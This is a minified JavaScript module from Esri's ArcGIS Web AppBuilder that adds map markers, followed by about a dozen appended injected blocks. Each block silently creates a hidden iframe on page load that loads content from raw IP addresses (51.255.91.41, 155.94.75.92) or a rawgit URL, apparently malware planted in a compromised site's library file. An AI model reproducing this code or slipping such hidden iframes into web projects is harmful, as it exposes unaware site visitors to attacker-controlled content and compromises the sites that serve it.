// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare ../BaseFeatureAction esri/graphic esri/layers/GraphicsLayer esri/symbols/PictureMarkerSymbol esri/InfoTemplate jimu/shareUtils".split(" "),function(g,h,k,l,m,n,e){return g(h,{name:"AddMarker",iconClass:"icon-add",_markerLayer:null,isFeatureSupported:function(a){this._getMarkerLayer();return this._isSupportType(a)&&0<a.features.length&&a.features[0]&&a.features[0].geometry&&!1===this._isFeatureInMarkerFeatureActionLayer(a)},onExecute:function(a,b){this._addMarker(a,b)},_getMarkerLayer:function(){if(this.map.getLayer("marker-feature-action-layer"))this._markerLayer=
this.map.getLayer("marker-feature-action-layer");else if(this._markerLayer=new l({id:"marker-feature-action-layer"}),this.map.addLayer(this._markerLayer),this.map.snappingManager){var a=this.map.snappingManager.layerInfos;a.push({layer:this._markerLayer});this.map.snappingManager.setLayerInfos(a)}},_addMarker:function(a,b){var c=a.features[0].geometry,d={};b=b.displayField||a.displayFieldName||b.objectIdField;d.title="";a.features[0].attributes&&b&&(d.title=a.features[0].attributes[b],d.title||(d.title=
""));b={};if("point"===c.type)b=c;else if("polygon"===c.type||"polyline"===c.type||"multipoint"===c.type)b=this.map.infoWindow&&this.map.infoWindow.isShowing?this.map.infoWindow.location:c.getExtent().getCenter();b.getLongitude()&&b.getLatitude()?(d.longitude=b.getLongitude(),d.latitude=b.getLatitude()):b.x&&b.y&&(d.x=b.x,d.y=b.y);var f="";c&&c.spatialReference&&c.spatialReference.wkid&&(f=c.spatialReference.wkid);d.spatialReference={wkid:f};c=e.getXyContent(d);d=e.getShareUrl(this.map,d,!0);d=e.getShareUrlContent(d);
d=c+d;c=new m(require.toUrl("jimu")+"/images/EsriBluePinCircle26.png");c.width=26;c.height=26;c.setOffset(0,c.height/2);b=new k(b,c,null,null);b._markerFeatureactionGraphic=a.features[0];b.infoTemplate=this._setInfoTemplate(d);this._markerLayer.add(b);this._closePopupWindow()},_setInfoTemplate:function(a){var b=new n;b.setContent(a);return b},_closePopupWindow:function(){this.map&&this.map.infoWindow&&this.map.infoWindow.hide()},_isFeatureInMarkerFeatureActionLayer:function(a){return a.features[0]&&
a.features[0]._graphicsLayer&&a.features[0]._graphicsLayer.id&&"marker-feature-action-layer"===a.features[0]._graphicsLayer.id?!0:!1},_isSupportType:function(a){if(a&&a.geometryType){if(a.features&&a.features.length&&1<a.features.length)return!1;a=a.geometryType;return"point"===a||"polygon"===a||"polyline"===a||"multipoint"===a}return!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});